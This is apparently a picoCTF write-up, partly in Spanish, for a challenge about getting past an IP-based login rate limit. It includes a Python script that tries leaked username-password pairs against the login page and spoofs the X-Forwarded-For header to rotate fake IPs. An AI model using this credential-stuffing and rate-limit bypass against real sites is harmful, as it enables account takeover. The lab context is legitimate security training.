#### Descripción 
Your friend is building a simple website with a login page.To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.To test their defense, they’ve:

- Created a dummy account with a random username–password pair from public credential lists.
- Given you those username and password lists.
- Shared the full source code.

Can you bypass the rate limit, log in, and capture the flag?Browse the site [here](http://candy-mountain.picoctf.net:60418/).App source code: `[here](https://challenge-files.picoctf.net/c_candy_mountain/0802ff891da39886f8a0dd812d9c7de5c7805159301f8b66ce4929786f4e28a9/app.py)`. Credentials dump `[here](https://challenge-files.picoctf.net/c_candy_mountain/0802ff891da39886f8a0dd812d9c7de5c7805159301f8b66ce4929786f4e28a9/creds-dump.txt)`.
#### Solución
```
import requests BASE = "http://candy-mountain.picoctf.net:60418" with open("creds-dump.txt", "r", errors="ignore") as f: creds = [line.strip().split(";") for line in f if ";" in line] ip_counter = 1 attempt = 0 for username, password in creds: if attempt % 9 == 0: ip_counter += 1 fake_ip = f"10.0.{ip_counter // 256}.{ip_counter % 256}" headers = {"X-Forwarded-For": fake_ip} r = requests.post(f"{BASE}/login", data={"username": username, "password": password}, headers=headers, allow_redirects=True) if "picoCTF" in r.text or "flag" in r.text.lower(): print(f"[+] Credenciales: {username}:{password}") print(r.text) break attempt += 1
```
#### Notas
El reto me proporcionó el código fuente de una aplicación Flask con rate limiting basado en IP, un dump de credenciales en formato `usuario;contraseña`, y la URL del sitio. Al analizar el código, identifiqué que el rate limiting usa `request.remote_addr` para trackear los intentos fallidos, con un límite de 10 intentos por IP cada 30 segundos. La vulnerabilidad es que el servidor no valida el header `X-Forwarded-For`, por lo que puedo falsificar mi IP en cada petición para nunca alcanzar el límite. Descargué el wordlist y escribí un script que itera sobre cada par `usuario;contraseña` del dump, rotando la IP falsa cada 9 intentos para mantenerse siempre por debajo del umbral de bloqueo:
#### Referencias